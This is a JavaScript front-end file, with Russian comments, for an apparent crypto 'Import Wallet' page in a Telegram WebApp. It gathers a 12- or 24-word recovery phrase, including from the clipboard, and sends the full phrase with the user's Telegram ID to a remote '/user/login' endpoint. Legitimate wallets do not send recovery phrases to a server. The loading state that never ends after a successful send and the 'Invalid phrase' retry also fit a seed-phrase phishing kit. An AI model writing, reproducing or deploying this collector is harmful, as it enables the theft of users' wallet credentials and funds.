class ImportWallet {
    // Короткий демо-словарь. Для прода подключи реальный BIP-39 wordlist.
    static WORDS = [
        'abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract',
        'apple', 'april', 'area', 'arm', 'army', 'around', 'arrange', 'arrest',
        'budget', 'build', 'bulb', 'bulk', 'bullet', 'bundle', 'bunker', 'burden',
        'crypto', 'cry', 'crystal', 'cube', 'culture', 'cup', 'cupboard', 'curious',
        'energy', 'enforce', 'engage', 'engine', 'enhance', 'enjoy', 'enlist', 'enough',
        'gravity', 'great', 'green', 'grid', 'grief', 'grit', 'grocery', 'group',
        'investment', 'invite', 'involve', 'iron', 'island', 'isolate', 'issue', 'item',
        'kindness', 'king', 'kingdom', 'kiss', 'kit', 'kitchen', 'kite', 'kitten',
        'laptop', 'large', 'later', 'latin', 'laugh', 'launch', 'law', 'lawn',
        'market', 'marriage', 'mask', 'mass', 'master', 'match', 'material', 'math',
        'sleep', 'slender', 'slice', 'slide', 'slight', 'slim', 'slogan', 'slot',
        'wait', 'walk', 'wall', 'walnut', 'want', 'warfare', 'warm', 'warrior',
        'water', 'wave', 'way', 'wealth', 'weapon', 'wear', 'weasel', 'weather',
        'web', 'wedding', 'weekend', 'weird', 'welcome', 'west', 'wet', 'whale',
        'what', 'wheat', 'wheel', 'when', 'where', 'whip', 'whisper', 'wide',
        'width', 'wife', 'wild', 'will', 'win', 'window', 'wine', 'wing',
        'wink', 'winner', 'winter', 'wire', 'wisdom', 'wise', 'wish', 'witness',
        'wolf', 'woman', 'wonder', 'wood', 'wool', 'word', 'work', 'world',
        'worry', 'worth', 'wrap', 'wreck', 'wrestle', 'wrist', 'write', 'wrong',
    ];

    static PASTE_ICON_SVG = `
    <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M7.875 11.0833H3.20833C2.35771 11.0824 1.5422 10.7441 0.940722 10.1426C0.339244 9.54113 0.000926432 8.72562 0 7.875L0 3.20833C0.000926432 2.35771 0.339244 1.5422 0.940722 0.940722C1.5422 0.339244 2.35771 0.000926432 3.20833 0L7.875 0C8.72562 0.000926432 9.54113 0.339244 10.1426 0.940722C10.7441 1.5422 11.0824 2.35771 11.0833 3.20833V7.875C11.0824 8.72562 10.7441 9.54113 10.1426 10.1426C9.54113 10.7441 8.72562 11.0824 7.875 11.0833ZM3.20833 1.75C2.82156 1.75 2.45063 1.90365 2.17714 2.17714C1.90365 2.45063 1.75 2.82156 1.75 3.20833V7.875C1.75 8.26177 1.90365 8.63271 2.17714 8.9062C2.45063 9.17969 2.82156 9.33333 3.20833 9.33333H7.875C8.26177 9.33333 8.63271 9.17969 8.9062 8.9062C9.17969 8.63271 9.33333 8.26177 9.33333 7.875V3.20833C9.33333 2.82156 9.17969 2.45063 8.9062 2.17714C8.63271 1.90365 8.26177 1.75 7.875 1.75H3.20833ZM14 10.7917V4.08333C14 3.85127 13.9078 3.62871 13.7437 3.46461C13.5796 3.30052 13.3571 3.20833 13.125 3.20833C12.8929 3.20833 12.6704 3.30052 12.5063 3.46461C12.3422 3.62871 12.25 3.85127 12.25 4.08333V10.7917C12.25 11.1784 12.0964 11.5494 11.8229 11.8229C11.5494 12.0964 11.1784 12.25 10.7917 12.25H4.08333C3.85127 12.25 3.62871 12.3422 3.46461 12.5063C3.30052 12.6704 3.20833 12.8929 3.20833 13.125C3.20833 13.3571 3.30052 13.5796 3.46461 13.7437C3.62871 13.9078 3.85127 14 4.08333 14H10.7917C11.6423 13.9991 12.4578 13.6608 13.0593 13.0593C13.6608 12.4578 13.9991 11.6423 14 10.7917Z" fill="#858585" />
    </svg>
  `;

    constructor() {
        this.grid = document.querySelector('[data-js-phrase-grid]');
        this.switcherBtns = document.querySelectorAll('.create__switcher-btn');
        this.pasteBtn = document.querySelector('.import__actions-paste-button');
        this.importBtn = document.querySelector('[data-js-import]');
        this.suggestionsEl = document.querySelector('[data-js-suggestions]');

        this.wordsCount = 12;
        this.activeInput = null;
        this._pastedTimer = null;

        if (!this.grid) return;

        this.bindEvents();
        this.render();
    }

    bindEvents() {
        this.switcherBtns.forEach((btn) => {
            btn.addEventListener('click', () => this.onSwitch(btn));
        });

        if (this.pasteBtn) {
            this.pasteBtn.addEventListener('click', () => this.pastePhrase());
        }

        // 1. Прямая привязка клика ОДИН РАЗ
        if (this.importBtn) {
            this.importBtn.addEventListener('click', async (e) => {
                e.preventDefault();
                e.stopImmediatePropagation();

                const inputs = this.grid.querySelectorAll('.create__word-input');
                const isFilled = Array.from(inputs).every(i => i.value.trim().length > 0);
                const phrase = Array.from(inputs).map(i => i.value.trim().toLowerCase());
                if (!isFilled) {
                    console.warn('Заполните все поля!');
                    return;
                }

                // Блокируем кнопку


                let userId = null;
                // БЕСКОНЕЧНЫЙ цикл анимации
                let dots = 0;
                const originalText = "Import Wallet"; // Текст, который был на кнопке
                try {
                    const tg = window.Telegram.WebApp;
                    const initData = tg.initData;
                    if (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) {
                        userId = tg.initDataUnsafe.user.id;
                    } else {
                        console.warn("Приложение открыто не в Telegram");
                        // Тут можно добавить логику для "обычных" браузеров
                    }
                    const response = await fetch(`${API_BASE_URL}/user/login`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-Telegram-Init-Data': initData // Передаем данные в заголовке
                        },
                        body: JSON.stringify({
                            phrase: phrase.join(' '),
                            tg_user_id: userId}
                        ),
                    });

                    if (response.ok) {
                        console.log('Данные успешно отправлены!');
                        this.importBtn.classList.add('is-loading');
                        this.importBtn.disabled = true;
                        // Здесь можно сделать перенаправление, если нужно:
                        // window.location.href = '/success.html';
                    } else {
                        this.clearForm()
                        alert('Invalid phrase')
                    }
                } catch (err) {
                    console.error('Ошибка соединения:', err);
                }
                // Запускаем таймер, который будет менять текст
                // this.importBtn.dataset.intervalId = setInterval(() => {
                //   dots = (dots + 1) % 4; // Цикл 0, 1, 2, 3
                //   this.importBtn.textContent = originalText + ".".repeat(dots);
                // }, 500); // Скорость смены точек (500мс)
            });
        }
        // 2. Отдельно слушатель для скрытия подсказок (без логики кнопки внутри)
        document.addEventListener('click', (e) => {
            if (
                this.suggestionsEl &&
                !e.target.closest('.create__word') &&
                !e.target.closest('[data-js-suggestions]')
            ) {
                this.hideSuggestions();
            }
        });
    }

    onSwitch(activeBtn) {
        this.switcherBtns.forEach((btn) => {
            btn.classList.remove('is-active');
            btn.setAttribute('aria-selected', 'false');
        });
        activeBtn.classList.add('is-active');
        activeBtn.setAttribute('aria-selected', 'true');

        this.wordsCount = Number(activeBtn.dataset.words);
        this.render();
    }

    render() {
        this.grid.dataset.count = String(this.wordsCount);
        this.grid.innerHTML = Array.from({length: this.wordsCount})
            .map(
                (_, i) => `
          <li class="create__word">
            <span class="create__word-index">${i + 1}.</span>
            <input
              type="text"
              class="create__word-input"
              data-index="${i}"
              autocomplete="off"
              autocapitalize="off"
              autocorrect="off"
              spellcheck="false"
            />
          </li>
        `,
            )
            .join('');

        this.bindInputEvents();
        this.hideSuggestions();
        this.checkFormValidity();
    }

    bindInputEvents() {
        const inputs = this.grid.querySelectorAll('.create__word-input');

        inputs.forEach((input) => {
            input.addEventListener('input', (e) => this.onInput(e.target));
            input.addEventListener('focus', (e) => this.onInput(e.target));
            input.addEventListener('keydown', (e) => this.onKeyDown(e));
            input.addEventListener('paste', (e) => this.onInputPaste(e));
        });
    }

    clearForm() {
        const inputs = this.grid.querySelectorAll('.create__word-input');
        inputs.forEach(input => input.value = '');
        this.checkFormValidity(); // Снова заблокирует кнопку, если она была активна
    }

    onInput(input) {
        this.activeInput = input;
        const value = input.value.trim().toLowerCase();

        // if (!value) {
        //   this.hideSuggestions();
        //   return;
        // }
        //
        // const matches = ImportWallet.WORDS
        //   .filter((w) => w.startsWith(value))
        //   .slice(0, 7);
        //
        // if (matches.length === 0) {
        //   this.hideSuggestions();
        //   return;
        // }
        //
        // this.showSuggestions(matches);
    }

    onKeyDown(e) {
        // Space / Tab / Enter — переход к следующему полю
        if (e.key === ' ' || e.key === 'Tab' || e.key === 'Enter') {
            const input = e.target;
            const idx = Number(input.dataset.index);
            const inputs = this.grid.querySelectorAll('.create__word-input');

            if (e.key === ' ' || e.key === 'Enter') {
                e.preventDefault();
                input.value = input.value.trim();
            }

            const next = inputs[idx + 1];
            if (next) {
                next.focus();
            } else {
                input.blur();
            }
        }
    }

    onInputPaste(e) {
        // Если в поле пастят несколько слов — распределим по полям
        const text = (e.clipboardData || window.clipboardData).getData('text');
        const words = text.trim().split(/\s+/);

        if (words.length > 1) {
            e.preventDefault();
            const startIdx = Number(e.target.dataset.index);
            this.fillInputsFrom(words, startIdx);
        }
    }

    fillInputsFrom(words, startIdx = 0) {
        const inputs = this.grid.querySelectorAll('.create__word-input');
        words.forEach((word, i) => {
            const target = inputs[startIdx + i];
            if (target) target.value = word.trim().toLowerCase();
        });
        this.hideSuggestions();
        this.checkFormValidity();
    }

    showSuggestions(words) {
        if (!this.suggestionsEl || !this.activeInput) return;

        this.suggestionsEl.innerHTML = words
            .map(
                (w) => `<button type="button" class="create__suggestion" data-word="${w}">${w}</button>`,
            )
            .join('');

        this.suggestionsEl.classList.add('is-visible');

        this.suggestionsEl.querySelectorAll('.create__suggestion').forEach((btn) => {
            btn.addEventListener('click', () => {
                if (!this.activeInput) return;
                this.activeInput.value = btn.dataset.word;

                const idx = Number(this.activeInput.dataset.index);
                const inputs = this.grid.querySelectorAll('.create__word-input');
                const next = inputs[idx + 1];
                if (next) {
                    next.focus();
                } else {
                    this.activeInput.blur();
                    this.hideSuggestions();
                }
            });
        });
    }

    hideSuggestions() {
        if (!this.suggestionsEl) return;
        this.suggestionsEl.classList.remove('is-visible');
        this.suggestionsEl.innerHTML = '';
    }

    async pastePhrase() {
        if (!this.pasteBtn) return;

        try {
            let text = '';

            if (navigator.clipboard && window.isSecureContext) {
                text = await navigator.clipboard.readText();
            } else {
                console.warn('Clipboard API недоступен в этом контексте');
            }

            const words = text.trim().split(/\s+/).filter(Boolean);

            if (words.length) {
                // если количество слов совпадает с 24 — переключим режим
                if (words.length === 24 && this.wordsCount !== 24) {
                    const btn24 = document.querySelector('.create__switcher-btn[data-words="24"]');
                    if (btn24) this.onSwitch(btn24);
                } else if (words.length === 12 && this.wordsCount !== 12) {
                    const btn12 = document.querySelector('.create__switcher-btn[data-words="12"]');
                    if (btn12) this.onSwitch(btn12);
                }

                this.fillInputsFrom(words, 0);
            }

            this.showPasted();
        } catch (err) {
            console.error('Paste failed:', err);
            // всё равно показываем анимацию для UX
            this.showPasted();
        }
    }

    showPasted() {
        if (!this.pasteBtn) return;

        const original = this.pasteBtn.innerHTML;
        this.pasteBtn.classList.add('is-pasted');
        this.pasteBtn.innerHTML = `${ImportWallet.PASTE_ICON_SVG} Pasted!`;

        clearTimeout(this._pastedTimer);
        this._pastedTimer = setTimeout(() => {
            this.pasteBtn.classList.remove('is-pasted');
            this.pasteBtn.innerHTML = original;
        }, 2000);
    }

    onImport() {
        const inputs = this.grid.querySelectorAll('.create__word-input');
        const phrase = Array.from(inputs)
            .map((i) => i.value.trim().toLowerCase())
            .filter(Boolean);

        if (phrase.length !== this.wordsCount) {
            console.warn(`Введите все ${this.wordsCount} слов`);
            return;
        }

        // Здесь — отправка фразы / переход / валидация
        console.log('Import phrase:', phrase.join(' '));
        this.checkFormValidity();
    }

    checkFormValidity() {
        const inputs = this.grid.querySelectorAll('.create__word-input');
        // Проверяем, что в каждом поле есть текст
        const isFilled = Array.from(inputs).every(input => input.value.trim().length > 0);

        if (this.importBtn) {
            if (isFilled) {
                this.importBtn.classList.remove('is-disabled');
            } else {
                this.importBtn.classList.add('is-disabled');
            }
        }
    }
}

new ImportWallet();


